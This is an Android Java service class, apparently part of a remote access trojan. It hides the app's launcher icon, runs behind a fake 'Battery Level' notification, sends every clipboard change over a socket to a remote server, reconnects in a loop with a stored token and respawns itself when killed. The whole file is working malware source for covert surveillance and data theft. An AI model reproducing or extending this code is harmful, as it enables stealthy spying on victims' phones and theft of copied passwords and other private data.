package com.remote.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;
import android.widget.Toast;

import com.remote.app.socket.IOSocket;


public class MainService extends Service {
    private static Context contextOfApplication;

    private static ConnectionManager connectionManager;

    @Override
    public void onCreate() {
        super.onCreate();

        PackageManager pkg = this.getPackageManager();
        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());

        initHealthCheck();

    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground() {
        String NOTIFICATION_CHANNEL_ID = "example.permanence";
        String channelName = "Battery Level Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Battery Level")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(1, notification);
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

//        PackageManager pkg=this.getPackageManager();
//        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = () -> {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip()) {
                ClipData clipData = clipboard.getPrimaryClip();
                if (clipData.getItemCount() > 0) {
                    CharSequence text = clipData.getItemAt(0).getText();
                    if (text != null) {
                        IOSocket.getInstance().send("_0xCB", text);
                    }
                }
            }
        };

        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);

        contextOfApplication = this;

        initHealthCheck();
        return START_STICKY;
    }

    private Thread healthThread;

    private void initHealthCheck() {
        if (connectionManager == null)
            connectionManager = new ConnectionManager(this);

        if (healthThread != null && healthThread.isAlive() && !healthThread.isInterrupted())
            return;


        healthThread = new Thread(() -> {
            SharedPreferences settings = getApplicationContext().getSharedPreferences("CONN_SETTINGS", 0);
            while (true) {
                try {
                    Thread.sleep(15000);

                    if (!settings.contains("user-token") || !settings.contains("finished-setup")) {
                        continue;
                    }

                    connectionManager.startAsync(settings.getString("user-token", null));

                    Thread.sleep(60000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });

        healthThread.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        sendBroadcast(new Intent("respawnService"));
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }
}
